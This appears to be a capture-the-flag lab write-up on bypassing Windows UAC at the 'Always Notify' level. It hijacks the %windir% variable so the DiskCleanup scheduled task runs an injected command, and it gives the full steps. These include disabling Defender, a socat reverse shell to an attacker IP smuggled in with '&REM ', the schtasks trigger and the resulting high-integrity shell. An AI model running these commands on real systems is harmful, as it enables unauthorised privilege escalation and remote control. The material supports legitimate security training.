# Bypassing Always Notify

On default Windows configurations, applications related to the system's configuration to bypass `UAC` can be used  
as most of these apps have the autoElevate flag set on their manifests. But if `UAC` is configured on the "Always Notify" 
level, `fodhelper` and similar apps won't be of any use as they will require the user to go through the `UAC` prompt to 
elevate. This prevents several known bypass methods. 

Scheduled tasks are an exciting target. By design, they are meant to be run without any user interaction (independent 
of the `UAC` security level), so asking the user to elevate a process manually is not an option. Any scheduled tasks 
that require elevation will automatically get it without going through a `UAC` prompt.

The Disk Cleanup Scheduled Task is configured to run with the Users account, which means it will inherit the 
privileges from the calling user. The Run with highest privileges option will use the highest privilege security 
token available to the calling user, which is a high IL token for an administrator. If a regular non-admin user 
invokes this task, it will execute with medium IL only since that is the highest privilege token available to 
non-admins, and a bypass would not work.

But ... the task can be run on-demand, executing the following command when invoked:

    %windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%

The command depends on environment variables, and it may be possible to inject commands through them and get them 
executed by starting the DiskCleanup task manually.

The `%windir%` variable can be overridden through the registry by creating an entry in `HKCU\Environment`. To execute 
a reverse shell using socat:

    cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM 

`&REM ` (ending with a blank space) is concatenated at the end to comment whatever is put after `%windir%` when 
expanding the environment variable to get the final command used by DiskCleanup.

## Lab

1. Disable Windows Defender
2. set up a listener for a reverse shell with nc:

```text
nc -lvp 4446
```

3. Connect to the backdoor provided on port 9999:

```text
nc MACHINE_IP 9999
```

4. Write the payload to `%windir%` and then execute the DiskCleanup task:

```text
C:\> reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f

C:\> schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```

5. In the shell with high IL, get the flag:

```text
$ nc -lvp 4446      
Listening on 0.0.0.0 4446
Connection received on 10.10.183.127 25631
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288

C:\flags\GetFlag-diskcleanup.exe
```

6. Clean up

```text
reg delete "HKCU\Environment" /v "windir" /f
```
